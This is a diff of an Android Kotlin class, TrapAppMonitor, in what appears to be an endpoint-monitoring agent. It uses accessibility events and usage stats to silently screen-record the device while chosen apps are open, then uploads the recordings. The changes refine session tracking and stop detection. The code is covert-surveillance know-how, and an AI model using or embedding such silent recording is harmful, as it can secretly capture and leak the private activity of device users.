@@ -3,10 +3,12 @@ package com.edr.agent.monitor
 import android.app.usage.UsageEvents
 import android.app.usage.UsageStatsManager
 import android.content.Context
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import com.edr.agent.screen.AppTrapScreenRecorder
+import com.edr.agent.service.EdrAccessibilityService
 import com.edr.agent.storage.EdrLocalStorage
 import com.edr.agent.storage.SyncPreferences
 import java.util.Collections
@@ -16,20 +18,23 @@ import java.util.concurrent.ConcurrentHashMap
  * TrapAppMonitor: Monitors for trapped (watched) apps opening on the device.
  *
  * When a configured app opens, it silently starts screen recording via AppTrapScreenRecorder.
- * When the app closes or the user navigates away, it stops and uploads the recording.
+ * When the app closes or the user navigates away, it cleanly stops and uploads the recording.
  *
- * Two detection paths:
- *  1. INSTANT: AccessibilityService TYPE_WINDOW_STATE_CHANGED -> onWindowChanged()
- *  2. FALLBACK: Slow UsageStats polling every 5s -> checkForegroundApp() (battery-safe backup)
- *
- * NO camera photos are taken. NO interaction with user apps. NO gestures or clicks.
+ * Key Design Principles:
+ *  1. One Continuous Recording per App Session:
+ *     Internal activity transitions, popups, keyboards, or transient overlays do NOT split the recording.
+ *  2. Robust Stop Confirmation:
+ *     Waits 3.5 seconds and verifies via multiple window layers before finalizing the recording.
+ *  3. No False Lockouts:
+ *     Short 2.5-second debounce between distinct sessions prevents duplicate launch events without blocking subsequent app opens.
  */
 object TrapAppMonitor {
     private const val TAG = "TrapAppMonitor"
 
-    // Cooldown prevents re-triggering within 30 seconds of the previous recording for the same app
-    private const val COOLDOWN_MS = 30_000L
-    private const val STOP_CONFIRM_DELAY_MS = 1500L
+    // Debounce to prevent multiple launch events during a single app startup
+    private const val SESSION_DEBOUNCE_MS = 2500L
+    // Confirmation delay before finalizing a recording after user appears to leave
+    private const val STOP_CONFIRM_DELAY_MS = 3500L
 
     private val TRANSIENT_SYSTEM_PACKAGES = setOf(
         "com.android.systemui",
@@ -46,47 +51,99 @@ object TrapAppMonitor {
         "com.miui.securitycenter",
         "com.google.android.inputmethod.latin",
         "com.emoji.keyboard.touchpal",
-        "com.baidu.input_vivo"
+        "com.baidu.input_vivo",
+        "com.sohu.inputmethod.sogou",
+        "com.touchtype.swiftkey",
+        "com.samsung.android.honeyboard"
     )
 
     private val trapPackages = Collections.synchronizedSet(mutableSetOf<String>())
-    private val cooldownMap = ConcurrentHashMap<String, Long>()
+    private val lastSessionEndTimeMap = ConcurrentHashMap<String, Long>()
     private val appLabelCache = ConcurrentHashMap<String, String>()
     private var isInitialized = false
     private val mainHandler = Handler(Looper.getMainLooper())
     private var pendingStopRunnable: Runnable? = null
+    private var pendingStopPkg: String? = null
+
     @Volatile
     private var lastPolledEventTime = 0L
 
-    // Own package name cached to avoid calling context.packageName on every event
+    // Own package name cached
     private var ownPackageName = ""
 
     private fun isTransientSystemPackage(pkg: String): Boolean {
+        if (pkg.isEmpty() || pkg == ownPackageName) return true
         if (pkg in TRANSIENT_SYSTEM_PACKAGES) return true
-        return pkg.contains("inputmethod", ignoreCase = true) ||
-            pkg.contains("keyboard", ignoreCase = true) ||
-            pkg.contains("systemui", ignoreCase = true) ||
-            pkg.contains("floatingball", ignoreCase = true)
+        val p = pkg.lowercase()
+        return p.contains("inputmethod") ||
+            p.contains("keyboard") ||
+            p.contains("systemui") ||
+            p.contains("floatingball") ||
+            p.contains("permissioncontroller") ||
+            p.contains("smartmultiwindow") ||
+            p.contains("autofill") ||
+            p.contains("documentsui") ||
+            p.contains("dialog") ||
+            p.contains("chooser") ||
+            p.contains("wallpaper") ||
+            p.contains("overlay") ||
+            p.contains("upslide") ||
+            p.contains("gms") ||
+            p == "android"
+    }
+
+    /**
+     * Checks all accessible window layers to verify if the expected package is still active on screen.
+     */
+    private fun isAppStillActiveOnScreen(expectedPkg: String): Boolean {
+        val a11y = EdrAccessibilityService.instance ?: return false
+        try {
+            // 1. Check primary active window
+            val activeRootPkg = a11y.rootInActiveWindow?.packageName?.toString()
+            if (activeRootPkg == expectedPkg) return true
+
+            // 2. Check all on-screen windows (popups, dialogs, sub-windows)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                val windowList = a11y.windows
+                for (w in windowList) {
+                    if (w.root?.packageName?.toString() == expectedPkg) {
+                        return true
+                    }
+                }
+            }
+        } catch (ignored: Exception) {}
+        return false
     }
 
     private fun scheduleDeferredStop(context: Context, expectedRecordingPkg: String, reason: String) {
-        if (pendingStopRunnable != null) return
         val appContext = context.applicationContext
+
+        // If a stop is already pending for this package, let it run; if for another, cancel and reset
+        if (pendingStopRunnable != null && pendingStopPkg == expectedRecordingPkg) {
+            return
+        }
+        cancelDeferredStop()
+
+        pendingStopPkg = expectedRecordingPkg
         val runnable = Runnable {
             pendingStopRunnable = null
+            pendingStopPkg = null
+
             if (AppTrapScreenRecorder.isCurrentlyRecording()
                 && AppTrapScreenRecorder.getRecordingPackage() == expectedRecordingPkg
             ) {
-                val activePkg = com.edr.agent.service.EdrAccessibilityService.instance
-                    ?.rootInActiveWindow?.packageName?.toString()
-                if (activePkg == expectedRecordingPkg) {
-                    Log.d(TAG, "Ignoring transient stop ($reason); '$expectedRecordingPkg' is still active.")
+                // Ground-truth check: is the app still on screen?
+                if (isAppStillActiveOnScreen(expectedRecordingPkg)) {
+                    Log.d(TAG, "Ignoring deferred stop ($reason); '$expectedRecordingPkg' is still visible on screen.")
                     return@Runnable
                 }
-                Log.i(TAG, "$reason. Stopping recording for '$expectedRecordingPkg'.")
+
+                Log.i(TAG, "$reason. Finalizing recording for '$expectedRecordingPkg'.")
                 AppTrapScreenRecorder.stopRecording(appContext)
+                lastSessionEndTimeMap[expectedRecordingPkg] = System.currentTimeMillis()
             }
         }
+
         pendingStopRunnable = runnable
         mainHandler.postDelayed(runnable, STOP_CONFIRM_DELAY_MS)
     }
@@ -95,6 +152,7 @@ object TrapAppMonitor {
         pendingStopRunnable?.let {
             mainHandler.removeCallbacks(it)
             pendingStopRunnable = null
+            pendingStopPkg = null
         }
     }
 
@@ -127,50 +185,69 @@ object TrapAppMonitor {
 
     /**
      * Called instantly by EdrAccessibilityService when the foreground window changes.
-     * This is the PRIMARY detection path. Runs on the accessibility thread — keep it fast.
+     * This is the PRIMARY real-time detection path.
      *
      * @param context Application context
      * @param pkg     Package name of the newly-foreground app/window
      */
     fun onWindowChanged(context: Context, pkg: String) {
-        // Ignore our own EDR agent app or transient overlays (SystemUI, keyboards, permission dialogs)
-        if (pkg.isEmpty() || pkg == ownPackageName || isTransientSystemPackage(pkg)) return
+        if (pkg.isEmpty() || pkg == ownPackageName || isTransientSystemPackage(pkg)) {
+            return
+        }
 
         if (trapPackages.contains(pkg)) {
+            // User is actively inside a trapped app
             cancelDeferredStop()
+
+            // If already recording this exact app, DO NOT re-trigger or split into multiple recordings
             if (AppTrapScreenRecorder.isCurrentlyRecording() && AppTrapScreenRecorder.getRecordingPackage() == pkg) {
                 return
             }
 
-            val now = System.currentTimeMillis()
-            val lastTrigger = cooldownMap[pkg] ?: 0L
-            if (now - lastTrigger < COOLDOWN_MS) return  // Still in cooldown
+            // If recording a different app, finalize the previous one first
+            if (AppTrapScreenRecorder.isCurrentlyRecording() && AppTrapScreenRecorder.getRecordingPackage() != pkg) {
+                Log.i(TAG, "Switched from '${AppTrapScreenRecorder.getRecordingPackage()}' to new trap '$pkg'. Finalizing previous recording.")
+                AppTrapScreenRecorder.stopRecording(context.applicationContext)
+            }
 
-            cooldownMap[pkg] = now
+            // Short debounce to prevent rapid double-starts during launcher animations
+            val now = System.currentTimeMillis()
+            val lastEnd = lastSessionEndTimeMap[pkg] ?: 0L
+            if (now - lastEnd < SESSION_DEBOUNCE_MS) {
+                Log.d(TAG, "Ignoring rapid re-launch within ${SESSION_DEBOUNCE_MS}ms debounce for '$pkg'.")
+                return
+            }
 
             val appLabel = resolveAppLabel(context, pkg)
-            Log.w(TAG, "TRAP: '$appLabel' ($pkg) opened. Starting silent screen recording.")
+            Log.w(TAG, "TRAP: '$appLabel' ($pkg) opened. Starting continuous screen recording.")
             EdrLocalStorage.appendEdrLog(
                 context, "TRAP_ALERT",
-                "Trap app opened: $appLabel. Screen recording started."
+                "Trap app opened: $appLabel. Continuous screen recording started."
             )
             AppTrapScreenRecorder.startRecording(context, pkg, appLabel)
 
         } else if (AppTrapScreenRecorder.isCurrentlyRecording()) {
-            // Confirm user truly navigated away from the trapped app before stopping
+            // User switched to an untrapped app or home screen; schedule stop with 3.5s confirmation
             val recordingPkg = AppTrapScreenRecorder.getRecordingPackage()
             if (recordingPkg != null && recordingPkg != pkg) {
-                scheduleDeferredStop(context, recordingPkg, "Window switched to '$pkg'")
+                scheduleDeferredStop(context, recordingPkg, "Window switched to non-trap '$pkg'")
             }
         }
     }
 
     /**
-     * Fallback poller using UsageStatsManager. Called every 5 seconds by EdrForegroundService.
-     * Only active as a safety net in case AccessibilityService events are delayed.
+     * Fallback poller using UsageStatsManager. Called periodically by EdrForegroundService.
+     * Acts strictly as a backup if AccessibilityService is not yet running.
      */
     fun checkForegroundApp(context: Context) {
         if (trapPackages.isEmpty() && !AppTrapScreenRecorder.isCurrentlyRecording()) return
+
+        // If AccessibilityService is connected and healthy, it handles all real-time events.
+        // We do not let UsageStats poller issue delayed stops to avoid race conditions.
+        val a11yReady = EdrAccessibilityService.isReady
+        if (a11yReady && AppTrapScreenRecorder.isCurrentlyRecording()) {
+            return
+        }
 
         val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return
         val now = System.currentTimeMillis()
@@ -188,7 +265,7 @@ object TrapAppMonitor {
                 latestTime = maxOf(latestTime, event.timeStamp)
 
                 val pkg = event.packageName ?: continue
-                if (pkg == ownPackageName || isTransientSystemPackage(pkg)) continue
+                if (isTransientSystemPackage(pkg)) continue
 
                 if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED) {
                     latestForegroundPkg = pkg
@@ -203,21 +280,22 @@ object TrapAppMonitor {
                 if (AppTrapScreenRecorder.isCurrentlyRecording() && AppTrapScreenRecorder.getRecordingPackage() == pkg) {
                     return
                 }
-                val lastTrigger = cooldownMap[pkg] ?: 0L
-                if (now - lastTrigger >= COOLDOWN_MS) {
-                    cooldownMap[pkg] = now
+
+                val nowTime = System.currentTimeMillis()
+                val lastEnd = lastSessionEndTimeMap[pkg] ?: 0L
+                if (nowTime - lastEnd >= SESSION_DEBOUNCE_MS) {
                     val appLabel = resolveAppLabel(context, pkg)
-                    Log.w(TAG, "TRAP (fallback poller): '$appLabel' ($pkg) opened.")
+                    Log.w(TAG, "TRAP (UsageStats backup): '$appLabel' ($pkg) opened.")
                     EdrLocalStorage.appendEdrLog(
                         context, "TRAP_ALERT",
-                        "Trap app opened (fallback): $appLabel. Screen recording started."
+                        "Trap app opened (backup): $appLabel. Screen recording started."
                     )
                     AppTrapScreenRecorder.startRecording(context, pkg, appLabel)
                 }
-            } else if (AppTrapScreenRecorder.isCurrentlyRecording()) {
+            } else if (!a11yReady && AppTrapScreenRecorder.isCurrentlyRecording()) {
                 val recordingPkg = AppTrapScreenRecorder.getRecordingPackage()
                 if (recordingPkg != null && recordingPkg != pkg) {
-                    scheduleDeferredStop(context, recordingPkg, "Fallback: switched to '$pkg'")
+                    scheduleDeferredStop(context, recordingPkg, "UsageStats backup: switched to '$pkg'")
                 }
             }
         } catch (e: Exception) {
